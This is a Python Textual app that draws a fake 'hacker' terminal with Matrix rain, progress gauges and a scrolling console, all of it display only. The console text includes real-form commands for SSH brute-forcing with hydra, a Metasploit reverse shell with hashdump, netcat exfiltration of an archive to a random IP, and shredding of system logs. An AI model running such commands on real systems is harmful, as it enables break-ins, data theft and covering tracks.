#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║   H A C K   T H E   P L A N E T  ::  a terminal extravaganza               ║
║                                                                            ║
║   The neon of HACKERS (1995) + the realism of MR. ROBOT + the green        ║
║   digital rain of THE MATRIX, smashed into one full-screen Textual app.    ║
║                                                                            ║
║   keys:  [q] disconnect   [space] ACCESS GRANTED flash   [m] mute rain     ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

from __future__ import annotations

import random
import time
from datetime import datetime

from rich.segment import Segment
from rich.style import Style
from rich.text import Text

from textual.app import App, ComposeResult
from textual.containers import Horizontal, Vertical, Container
from textual.strip import Strip
from textual.widget import Widget
from textual.widgets import RichLog, Static

try:
    from pyfiglet import Figlet
except Exception:  # pragma: no cover
    Figlet = None


# ───────────────────────────── palette ──────────────────────────────────────
NEON_GREEN = "#00ff66"
DIM_GREEN = "#1f7a45"
CYBER_CYAN = "#33e1ff"
HOT_PINK = "#ff2bd6"
ALERT_RED = "#ff3355"
WARN_AMBER = "#ffb000"
GOLD = "#ffd700"
GHOST = "#cfe8ff"


# ───────────────────────────── matrix glyphs ────────────────────────────────
# Half-width katakana are single terminal cells, so columns stay aligned.
_KATA = [chr(c) for c in range(0xFF66, 0xFF9D)]
_EXTRA = list("0123456789Zﾊﾝﾐｦｱ$+-*<>=#%@&¦|ç╳█:.\"")
RAIN_CHARS = _KATA + _EXTRA


# ───────────────────────────── flavor helpers ───────────────────────────────
def rip() -> str:
    """Random IPv4."""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def rhex(n: int) -> str:
    return "".join(random.choice("0123456789abcdef") for _ in range(n))


def rmac() -> str:
    return ":".join(rhex(2) for _ in range(6)).upper()


HOSTS = [
    "gibson", "e-corp-db", "steel-mountain", "allsafe-vpn", "dark-army-c2",
    "cyprus-natl-bk", "femtocell-07", "smarthome-hub", "plc-scada-3",
    "mail-relay-2", "dns-root-b", "edge-firewall", "bank-core-1", "hsm-vault",
    "cam-net-19", "badusb-bridge", "krang-mainframe", "razor-blade",
]

PASSWORDS = [
    "hunter2", "tr0ub4dor&3", "letmein", "god", "P@ssw0rd!", "correcthorse",
    "qwerty123", "summer2024", "fsociety", "mrrobot", "samsepi0l", "admin",
]

CVES = [
    "CVE-2021-4034  PwnKit (polkit pkexec) LPE",
    "CVE-2014-6271  Shellshock (bash env)",
    "CVE-2017-0144  EternalBlue (SMBv1 RCE)",
    "CVE-2021-44228 Log4Shell (JNDI lookup)",
    "CVE-2019-0708  BlueKeep (RDP pre-auth)",
    "CVE-2008-0166  Debian OpenSSL weak keys",
]


# ───────────────────────────── console scenes ───────────────────────────────
# Each scene returns a list of pre-styled (Rich markup) console lines.
def scene_nmap() -> list[str]:
    tgt = rip()
    out = [
        f"[{DIM_GREEN}]root@fsociety[/][{NEON_GREEN}]:~#[/] [b {GHOST}]nmap -sS -sV -p- -T4 {tgt}/24[/]",
        f"[{DIM_GREEN}]Starting Nmap 7.94 ( https://nmap.org ) at {datetime.now():%H:%M %Z}[/]",
        f"[{NEON_GREEN}]Nmap scan report for {random.choice(HOSTS)} ({tgt})[/]",
        f"[{DIM_GREEN}]Host is up (0.000{random.randint(11,89)}s latency).[/]",
        f"[{DIM_GREEN}]PORT      STATE SERVICE     VERSION[/]",
    ]
    pool = [
        f"[{NEON_GREEN}]22/tcp[/]    [{GOLD}]open[/]  ssh         OpenSSH 8.{random.randint(0,9)}p1 Ubuntu",
        f"[{NEON_GREEN}]80/tcp[/]    [{GOLD}]open[/]  http        nginx 1.{random.randint(14,25)}.0",
        f"[{NEON_GREEN}]443/tcp[/]   [{GOLD}]open[/]  ssl/https   nginx (TLSv1.3)",
        f"[{NEON_GREEN}]445/tcp[/]   [{GOLD}]open[/]  microsoft-ds Samba smbd 4.x",
        f"[{NEON_GREEN}]3306/tcp[/]  [{GOLD}]open[/]  mysql       MySQL 5.7.{random.randint(20,40)}",
        f"[{NEON_GREEN}]6379/tcp[/]  [{GOLD}]open[/]  redis       Redis 6.0.{random.randint(1,9)} (no-auth)",
        f"[{NEON_GREEN}]8080/tcp[/]  [{GOLD}]open[/]  http-proxy  Apache Tomcat 9.0",
    ]
    out += random.sample(pool, k=random.randint(3, len(pool)))
    out.append(f"[{CYBER_CYAN}][+] Service detection performed. 1 host up.[/]")
    return out


def scene_hydra() -> list[str]:
    tgt, user = rip(), random.choice(["root", "admin", "elliot", "dade"])
    out = [
        f"[{DIM_GREEN}]root@fsociety[/][{NEON_GREEN}]:~#[/] [b {GHOST}]hydra -l {user} -P rockyou.txt ssh://{tgt}[/]",
        f"[{DIM_GREEN}]Hydra v9.5 (c) by van Hauser/THC - for legal use only[/]",
    ]
    for _ in range(random.randint(3, 6)):
        out.append(
            f"[{WARN_AMBER}][ATTEMPT][/] {tgt} - login \"{user}\" - "
            f"pass \"{random.choice(PASSWORDS)}\" - {random.randint(1,4000)} of 14344399"
        )
    pwd = random.choice(PASSWORDS)
    out.append(
        f"[b {NEON_GREEN}][22][ssh] host: {tgt}   login: {user}   password: {pwd}[/]"
    )
    out.append(f"[{CYBER_CYAN}][+] 1 valid password found. credentials cached.[/]")
    return out


def scene_msf() -> list[str]:
    tgt = rip()
    cve = random.choice(CVES)
    return [
        f"[{ALERT_RED}]msf6[/] [{DIM_GREEN}]>[/] [b {GHOST}]use exploit/multi/handler[/]",
        f"[{ALERT_RED}]msf6 exploit(handler)[/] [{DIM_GREEN}]>[/] [b {GHOST}]set LHOST 10.0.0.5[/]",
        f"[{DIM_GREEN}][*] Payload => windows/x64/meterpreter/reverse_tcp[/]",
        f"[{WARN_AMBER}][!] {cve}[/]",
        f"[{DIM_GREEN}][*] Started reverse TCP handler on 10.0.0.5:4444[/]",
        f"[{DIM_GREEN}][*] Sending stage ({random.randint(180000,210000)} bytes) to {tgt}[/]",
        f"[b {NEON_GREEN}][*] Meterpreter session 1 opened ({tgt}:4444) at {datetime.now():%H:%M:%S}[/]",
        f"[{ALERT_RED}]meterpreter[/] [{DIM_GREEN}]>[/] [b {GHOST}]getuid[/]",
        f"[{NEON_GREEN}]Server username: NT AUTHORITY\\SYSTEM[/]",
        f"[{ALERT_RED}]meterpreter[/] [{DIM_GREEN}]>[/] [b {GHOST}]hashdump[/]",
        f"[{GHOST}]Administrator:500:aad3b435b51404ee:{rhex(32)}:::[/]",
        f"[{GHOST}]elliot:1000:aad3b435b51404ee:{rhex(32)}:::[/]",
    ]


def scene_exfil() -> list[str]:
    out = [
        f"[{DIM_GREEN}]root@fsociety[/][{NEON_GREEN}]:~#[/] [b {GHOST}]tar czf - /var/lib/ecorp | "
        f"openssl enc -aes-256-cbc | nc {rip()} 31337[/]",
    ]
    for _ in range(random.randint(4, 7)):
        out.append(
            f"[{DIM_GREEN}]exfil[/] {rhex(4)}  "
            + " ".join(rhex(2) for _ in range(random.randint(8, 14)))
            + f"  [{CYBER_CYAN}]{random.randint(2,98)}% [{rip()}][/]"
        )
    out.append(f"[b {NEON_GREEN}][+] {random.randint(2,940)} GB exfiltrated. wiping logs...[/]")
    out.append(f"[{ALERT_RED}]> shred -u /var/log/auth.log /var/log/syslog[/]")
    return out


def scene_matrix() -> list[str]:
    return random.choice([
        [f"[b {GHOST}]Wake up, Neo...[/]"],
        [f"[b {GHOST}]The Matrix has you...[/]"],
        [f"[b {GHOST}]Follow the white rabbit.[/]"],
        [f"[b {GHOST}]Knock, knock, Neo.[/]"],
        [f"[{NEON_GREEN}]Call trans opt: received. 2-19-98 13:24:18 REC:Log>[/]",
         f"[{NEON_GREEN}]Trace program: running[/]"],
    ])


def scene_hackers() -> list[str]:
    return random.choice([
        [f"[b {HOT_PINK}]>>> HACK THE PLANET <<<[/]"],
        [f"[{HOT_PINK}]MESS WITH THE BEST, DIE LIKE THE REST.[/]"],
        [f"[{CYBER_CYAN}]accessing the GIBSON supercomputer...[/]",
         f"[{NEON_GREEN}]da Vinci virus quarantined. garbage file uploaded.[/]"],
        [f"[{HOT_PINK}]ZERO COOL // ACID BURN // CRASH OVERRIDE online[/]"],
    ])


SCENES = [
    scene_nmap, scene_nmap, scene_hydra, scene_msf, scene_msf,
    scene_exfil, scene_matrix, scene_hackers,
]


# ───────────────────────────── Matrix rain widget ───────────────────────────
class MatrixRain(Widget):
    """The Matrix digital rain, rendered via the Line API for speed."""

    DEFAULT_CSS = "MatrixRain { background: #000000; }"

    def __init__(self) -> None:
        super().__init__()
        self.cols = 0
        self.rows = 0
        self.heads: list[float] = []
        self.speeds: list[float] = []
        self.lengths: list[int] = []
        self.grid: list[list[str]] = []
        self.paused = False

    def on_mount(self) -> None:
        self._timer = self.set_interval(0.06, self._tick)

    def _resize(self, w: int, h: int) -> None:
        self.cols, self.rows = w, h
        self.heads = [random.uniform(-h, 0) for _ in range(w)]
        self.speeds = [random.uniform(0.25, 0.95) for _ in range(w)]
        self.lengths = [random.randint(max(4, h // 4), max(5, h)) for _ in range(w)]
        self.grid = [[random.choice(RAIN_CHARS) for _ in range(w)] for _ in range(h)]

    def _tick(self) -> None:
        if self.paused:
            return
        w, h = self.size.width, self.size.height
        if w <= 0 or h <= 0:
            return
        if w != self.cols or h != self.rows:
            self._resize(w, h)
        # randomly mutate a handful of glyphs so columns shimmer
        for _ in range(max(1, (w * h) // 38)):
            self.grid[random.randrange(h)][random.randrange(w)] = random.choice(RAIN_CHARS)
        # advance the drops
        for x in range(w):
            self.heads[x] += self.speeds[x]
            if self.heads[x] - self.lengths[x] > h:
                self.heads[x] = random.uniform(-h // 2, 0.0)
                self.speeds[x] = random.uniform(0.25, 0.95)
                self.lengths[x] = random.randint(max(4, h // 4), max(5, h))
        self.refresh()

    def render_line(self, y: int) -> Strip:
        w = self.size.width
        if not self.grid or w != self.cols or y >= len(self.grid):
            return Strip.blank(w)
        row = self.grid[y]
        segments: list[Segment] = []
        for x in range(w):
            dist = self.heads[x] - y
            length = self.lengths[x]
            if dist < 0 or dist >= length:
                segments.append(Segment(" "))
                continue
            ch = row[x]
            if dist < 1:  # the bright leading drop
                segments.append(Segment(ch, Style(color="#eaffea", bold=True)))
            else:
                frac = dist / length
                g = max(45, int(255 * (1.0 - frac) ** 1.4))
                segments.append(Segment(ch, Style(color=f"#00{g:02x}2a")))
        return Strip(segments, w)


# ───────────────────────────── neon gauge widget ────────────────────────────
class Gauge(Widget):
    """A self-animating Hollywood progress bar with a label + verdict."""

    DEFAULT_CSS = "Gauge { height: 1; }"

    def __init__(self, label: str, color: str, done_word: str) -> None:
        super().__init__()
        self.label = label
        self.color = color
        self.done_word = done_word
        self.value = random.uniform(0, 40)
        self.speed = random.uniform(0.8, 3.2)
        self.hold = 0

    def on_mount(self) -> None:
        self.set_interval(0.1, self._tick)

    def _tick(self) -> None:
        if self.hold > 0:
            self.hold -= 1
            if self.hold == 0:
                self.value = 0.0
                self.speed = random.uniform(0.8, 3.2)
        else:
            self.value += self.speed * random.uniform(0.3, 1.7)
            if self.value >= 100:
                self.value = 100
                self.hold = random.randint(10, 26)
        self.refresh()

    def render(self) -> Text:
        w = self.size.width
        if w <= 0:
            return Text("")
        pct = int(self.value)
        label = f"{self.label:<9}"
        done = self.hold > 0
        suffix = f" [{self.done_word}]" if done else f" {pct:>3}%"
        bar_w = max(4, w - len(label) - len(suffix) - 2)
        filled = int(bar_w * self.value / 100)
        t = Text()
        t.append(label, Style(color=self.color, bold=True))
        t.append("⟦", Style(color=DIM_GREEN))
        t.append("█" * filled, Style(color=self.color, bold=True))
        t.append("░" * (bar_w - filled), Style(color="#11331f"))
        t.append("⟧", Style(color=DIM_GREEN))
        t.append(suffix, Style(color=GHOST if done else self.color, bold=done))
        return t


# ───────────────────────────── target list widget ───────────────────────────
class Targets(Widget):
    """A live list of nodes marching from SCANNING → ROOTED."""

    STATES = [
        ("◌ SCANNING", WARN_AMBER),
        ("◑ PROBING ", "#ff8a3d"),
        ("◓ EXPLOIT ", ALERT_RED),
        ("◕ BREACHED", "#ff1f5a"),
        ("● ROOTED  ", NEON_GREEN),
    ]

    def __init__(self) -> None:
        super().__init__()
        self.nodes: list[dict] = []

    def on_mount(self) -> None:
        hosts = random.sample(HOSTS, k=min(len(HOSTS), 16))
        self.nodes = [
            {"host": h, "ip": rip(), "state": random.randint(0, 2), "wait": random.randint(2, 16)}
            for h in hosts
        ]
        self.set_interval(0.45, self._tick)

    def _tick(self) -> None:
        n = random.choice(self.nodes)
        if n["wait"] > 0:
            n["wait"] -= 1
        elif n["state"] < len(self.STATES) - 1:
            n["state"] += 1
            n["wait"] = random.randint(2, 14)
        elif random.random() < 0.18:  # rooted boxes occasionally rotate to a new target
            n.update(host=random.choice(HOSTS), ip=rip(), state=0, wait=random.randint(3, 14))
        self.refresh()

    def render(self) -> Text:
        t = Text()
        height = max(1, self.size.height)
        for n in self.nodes[:height]:
            word, color = self.STATES[n["state"]]
            t.append(f"{n['host']:<15}", Style(color=GHOST))
            t.append(f"{n['ip']:<16}", Style(color=DIM_GREEN))
            t.append(word + "\n", Style(color=color, bold=n["state"] >= 3))
        return t


# ───────────────────────────── full-screen flash ────────────────────────────
class Flash(Static):
    """Overlay that screams ACCESS GRANTED across the whole screen."""

    def on_mount(self) -> None:
        self.display = False

    def fire(self, text: str, color: str) -> None:
        body = text
        if Figlet is not None:
            for font in ("ansi_shadow", "banner3", "big", "standard"):
                try:
                    body = Figlet(font=font, width=200).renderText(text).rstrip("\n")
                    break
                except Exception:
                    continue
        self.update(Text(body, style=Style(color=color, bold=True), justify="center"))
        self.display = True
        self.set_timer(1.3, self._hide)

    def _hide(self) -> None:
        self.display = False


# ───────────────────────────── the app ──────────────────────────────────────
class HackThePlanet(App):
    TITLE = "fsociety :: HACK THE PLANET"

    CSS = """
    Screen {
        layers: base overlay;
        background: #000000;
        color: #00ff66;
    }

    #banner {
        height: auto;
        content-align: center middle;
        text-align: center;
        background: #000000;
        padding: 0 1;
    }

    #main {
        height: 1fr;
    }

    #rain-pane {
        width: 1fr;
        border: round #0a5e2f;
        border-title-color: #00ff66;
        border-title-align: center;
    }
    MatrixRain { height: 1fr; }

    #console {
        width: 2fr;
        border: round #0a5e2f;
        border-title-color: #00ff66;
        border-title-align: center;
        background: #000000;
        scrollbar-color: #0a5e2f;
        scrollbar-background: #000000;
    }

    #side {
        width: 1fr;
    }

    #targets-pane {
        height: 1fr;
        border: round #0a5e2f;
        border-title-color: #00ff66;
        border-title-align: center;
    }
    Targets { height: 1fr; }

    #gauges-pane {
        height: auto;
        border: round #0a5e2f;
        border-title-color: #00ff66;
        border-title-align: center;
        padding: 0 1;
    }

    #status {
        dock: bottom;
        height: 1;
        background: #021a0e;
        color: #00ff66;
        padding: 0 1;
    }

    #flash {
        layer: overlay;
        width: 100%;
        height: 100%;
        background: #000000 85%;
        content-align: center middle;
        text-align: center;
    }
    """

    BINDINGS = [
        ("q", "quit", "disconnect"),
        ("ctrl+c", "quit", "disconnect"),
        ("space", "flash", "ACCESS GRANTED"),
        ("m", "mute", "toggle rain"),
    ]

    def __init__(self) -> None:
        super().__init__()
        self.queue: list[str] = []
        self.hops = ["TOR", "127.0.0.1"] + [rip() for _ in range(4)]
        self.hop_idx = 0
        self.blink = True

    # ----- layout -----
    def compose(self) -> ComposeResult:
        yield Static(self._make_banner(), id="banner")
        with Horizontal(id="main"):
            with Container(id="rain-pane") as rp:
                rp.border_title = "// MATRIX_RAIN"
                yield MatrixRain()
            console = RichLog(highlight=False, markup=True, wrap=False,
                              max_lines=1500, auto_scroll=True, id="console")
            console.border_title = "// ~/exploits :: live shell"
            yield console
            with Vertical(id="side"):
                with Container(id="targets-pane") as tp:
                    tp.border_title = "// TARGET_ACQUISITION"
                    yield Targets()
                with Vertical(id="gauges-pane") as gp:
                    gp.border_title = "// SYSTEM_BREACH"
                    yield Gauge("DECRYPT", NEON_GREEN, "CRACKED")
                    yield Gauge("BRUTE", WARN_AMBER, "PWNED")
                    yield Gauge("FIREWALL", CYBER_CYAN, "BYPASS")
                    yield Gauge("UPLINK", HOT_PINK, "SENT")
                    yield Gauge("TRACE", ALERT_RED, "BURNED")
        yield Static("", id="status")
        yield Flash(id="flash")

    def on_mount(self) -> None:
        self.shell = self.query_one("#console", RichLog)
        self.shell.write(f"[{DIM_GREEN}]" + "─" * 60 + "[/]")
        self.shell.write(f"[b {NEON_GREEN}]fsociety secure shell // session {rhex(8)} established[/]")
        self.shell.write(f"[{DIM_GREEN}]" + "─" * 60 + "[/]")
        self.set_interval(0.16, self._feed)
        self.set_interval(0.5, self._status)
        self.set_interval(0.53, self._blink)
        # auto-trigger the dramatic flash now and then
        self.set_interval(17.0, lambda: self.action_flash())

    # ----- banner -----
    def _make_banner(self) -> Text:
        title = "HACK  THE  PLANET"
        block = title
        if Figlet is not None:
            for font in ("slant", "standard", "big"):
                try:
                    block = Figlet(font=font, width=200).renderText(title).rstrip("\n")
                    break
                except Exception:
                    continue
        lines = block.split("\n")
        grad = [NEON_GREEN, "#19ff7a", CYBER_CYAN, "#19ff7a", NEON_GREEN, DIM_GREEN]
        t = Text(justify="center")
        for i, line in enumerate(lines):
            t.append(line + "\n", Style(color=grad[i % len(grad)], bold=True))
        t.append("[ ", Style(color=DIM_GREEN))
        t.append("HACKERS", Style(color=HOT_PINK, bold=True))
        t.append(" :: ", Style(color=DIM_GREEN))
        t.append("MR. ROBOT", Style(color=GHOST, bold=True))
        t.append(" :: ", Style(color=DIM_GREEN))
        t.append("THE MATRIX", Style(color=NEON_GREEN, bold=True))
        t.append(" ]", Style(color=DIM_GREEN))
        return t

    # ----- timers -----
    def _feed(self) -> None:
        if not self.queue:
            self.queue.extend(random.choice(SCENES)())
        # burst a couple of lines sometimes for that frantic typing feel
        for _ in range(1 if random.random() > 0.35 else random.randint(2, 3)):
            if self.queue:
                self.shell.write(self.queue.pop(0))

    def _status(self) -> None:
        self.hop_idx = (self.hop_idx + 1) % len(self.hops)
        t = Text()
        t.append(f" {datetime.now():%H:%M:%S} ", Style(color=NEON_GREEN, bold=True))
        t.append("│ ROUTE ", Style(color=DIM_GREEN))
        for i, hop in enumerate(self.hops):
            on = i == self.hop_idx
            t.append(hop, Style(color=GOLD if on else DIM_GREEN, bold=on, reverse=on))
            if i < len(self.hops) - 1:
                t.append(" ⟶ ", Style(color=DIM_GREEN))
        t.append("  │ ", Style(color=DIM_GREEN))
        t.append("ENCRYPTED", Style(color=NEON_GREEN, bold=True))
        t.append("  │ [q]uit [space]ACCESS [m]ute ", Style(color=DIM_GREEN))
        t.append("█" if self.blink else " ", Style(color=NEON_GREEN))
        self.query_one("#status", Static).update(t)

    def _blink(self) -> None:
        self.blink = not self.blink

    # ----- actions -----
    def action_flash(self) -> None:
        word, color = random.choice([
            ("ACCESS GRANTED", NEON_GREEN),
            ("ROOT", NEON_GREEN),
            ("PWNED", HOT_PINK),
            ("HACK THE PLANET", NEON_GREEN),
        ])
        self.query_one("#flash", Flash).fire(word, color)
        self.shell.write(f"[b {color}]>>> {word} <<<[/]")

    def action_mute(self) -> None:
        rain = self.query_one(MatrixRain)
        rain.paused = not rain.paused


if __name__ == "__main__":
    HackThePlanet().run()
